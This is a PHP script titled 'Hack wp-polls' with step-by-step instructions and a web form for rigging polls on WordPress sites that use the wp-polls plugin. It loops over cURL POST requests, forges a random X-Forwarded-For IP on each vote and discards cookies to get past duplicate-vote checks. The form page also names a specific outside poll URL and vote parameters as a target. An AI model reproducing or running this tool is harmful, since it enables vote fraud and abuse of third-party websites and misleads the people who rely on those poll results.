<?php
/**
 * Copyright 2009; Dr Small
 *
 * A simple way to increase a specific number of votes on
 * a wp-polls poll. It sets a new IP in the X-Forwarded-For
 * header, every time it executes, dumps cookies to /tmp and
 * doesn't read them the next time around.
 *
 * Howto use:
 *      a) Find a Wordpress blog that uses a wp-polls poll
 *      b) Use the URL as http://d...content-available-to-author-only...n.tld/wp-content/plugins/wp-polls/wp-polls.php
 *      c) View the page source, and find `name="poll_id" value="52"`
 *      d) Use the value as your poll_id
 *      e) Find the value of the specific poll option you want to vote on (i.e, name="poll_52" value="548")
 *      f) Specify how many votes go toward that option (with votes)
 *
 * This same kind of method could be used on almost any kind of poll
 * that does not use "user registration & activation" to vote.
 **/

/**
 * name:        Hack wp-polls
 * @param:      url             string          The URL to the plugins/wp-polls/wp-polls.php file
 * @param:      poll_id         int             The Poll ID
 * @param:      poll_value      int             The option being voted on
 * @param:      vote            int             How many times to vote on a given poll (default: 5)
 * @param:      verbose         string          How verbose to be (default: true)
 * @description:                                A proof of concept way to hack wp-polls.
 **/
function hack_wp_polls($url="http://w...content-available-to-author-only...m.br/wp-content/plugins/wp-polls/wp-polls.php", $poll_id=10, $poll_value=300, $vote=300, $verbose="false"){

        // Generate a 4 octive random IP address
        function makeUniqueIP(){
                srand((double)microtime()*1000000); 
                $ip = rand(1,255).".".rand(0,255).".".rand(0,255).".".rand(1,255); 
                return $ip;
        }
        
        $i = 1;
        while ($i <= $vote){
                $v .= "starting loop....<br />";
                
                // Generate a unique value
                $ip = makeUniqueIP();
                $v .= "makeUniqueIP() returned $ip<br />";

                // create a new cURL resource
                $ch = curl_init();
                $v .= "opening curl resource....<br />";

                // wp-polls may be checking the IP Address of the
                // user, to make sure he doesn't send data twice;
                // send a unique IP each time (Wordpress checks X-Forwarded-For)
                $headerarray = array(
                        "X-Forwarded-For: $ip");
        
                // The POST data to be sent
                $postfields = "vote=+++Vote+++&poll_id=$poll_id&poll_$poll_id=$poll_value";
                
                // set URL and other appropriate options
                curl_setopt($ch, CURLOPT_URL, $url);
                $v .= "setting CURLOPT_URL to $url<br />";
                
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, "cURL bot");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headerarray);
                curl_setopt($ch, CURLOPT_POST, true);
                $v .= "setting CURLOPT_POST to true<br />";
                
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
                $v .= "setting CURLOPT_POSTFIELDS to $postfields<br />";
                
                curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookiefile.txt');
                $v .= "setting CURLOPT_COOKIEJAR to /tmp/cookiefile.txt<br />";

                curl_exec($ch);
                $v .= "executing curl...<br />";

                // close cURL resource, and free up system resources
                curl_close($ch);
                $v .= "closing curl resource....<br /><br /><br />";
                                
                // Be verbose, if requested.
                if ($verbose == "true"){
                        echo $v;
                        $v = '';
                }
                $i++;
        }
}

if ($_POST[url] && $_POST[poll_id] && $_POST[option] && $_POST[verbose]){
        hack_wp_polls($_POST[url], $_POST[poll_id], $_POST[option], $_POST[votes], $_POST[verbose]);
} else {


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://w...content-available-to-author-only...3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://w...content-available-to-author-only...3.org/1999/xhtml" xml:lang="en" lang="en">
        <head>
                <title>hAcK wP-p0lLz</title>
        </head>
        <body>
                <h1>hAcK wP-p0lLz</h1>
                <p> Hola amigos, para votar aqui:
                tp_choices=6628786f39e8cabf17482364311eed69
                tp_poll_id=511
                tp_action=vote
                url: http://vota.ponteenalgo.com/xmlrpc.php</p>
                <form action="<?php echo $_SERVER[PHP_SELF];?>" method="post">
                <table>
                        <tbody>
                                <tr>
                                        <td>URL:</td>
                                        <td>poll_id:</td>
                                        <td>option:</td>
                                        <td>votes:</td>
                                        <td>verbose:</td>
                                </tr>
                                <tr>
                                        <td><input type="text" name="url" value="" /></td>
                                        <td><input type="text" name="poll_id" value="" size="3"/></td>
                                        <td><input type="text" name="option" value="" size="3"/></td>
                                        <td><input type="text" name="votes" value="" size="3"/></td>
                                        <td><select name="verbose">
                                                <option value="true" selected="selected">true</option>
                                                <option value="false">false</option>
                                        </select></td>
                                                
                                </tr>
                        </tbody>
                </table>
                <input type="submit" value="Vote" />
                </form>
        </body>
</html>
<?php } ?>
